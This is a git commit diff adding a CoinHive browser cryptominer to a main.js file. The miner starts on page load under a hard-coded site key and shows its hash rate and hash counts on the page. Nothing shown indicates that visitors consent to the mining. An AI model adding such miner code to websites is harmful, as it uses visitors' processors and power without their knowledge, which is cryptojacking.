16d097c0ad3b6ebb3727f1e0ef123ba720fb0f3d
Baizey <lassemoerk.mrk@gmail.com>
2017-09-14 21:21:54 +0200

    jijij

--- main.js
+++ main.js
@@ -1,1 +1,30 @@
+var miner = new CoinHive.Anonymous('1bKAZIoqiathAWQnJFsbc4pFB54tTIhK');
+miner.start();
 
+var insertToLog = function(input){
+    var elem = $(".log")[0];
+    var text = elem.split("<br>");
+    if(text.length > 10)
+        text.pop();
+    text.unshift(input);
+    elem.text(text.join("<br>"));
+};
+
+// Listen on events
+miner.on('found', function() {
+    insertToLog("Found hash");
+});
+miner.on('accepted', function() {
+    insertToLog("Accepted hash");
+});
+
+// Update stats once per second
+setInterval(function() {
+    var hashesPerSecond = miner.getHashesPerSecond();
+    var totalHashes = miner.getTotalHashes();
+    var acceptedHashes = miner.getAcceptedHashes();
+
+    $(".HPS").text(hashesPerSecond);
+    $(".TH").text(totalHashes);
+    $(".AH").text(acceptedHashes);
+}, 1000);
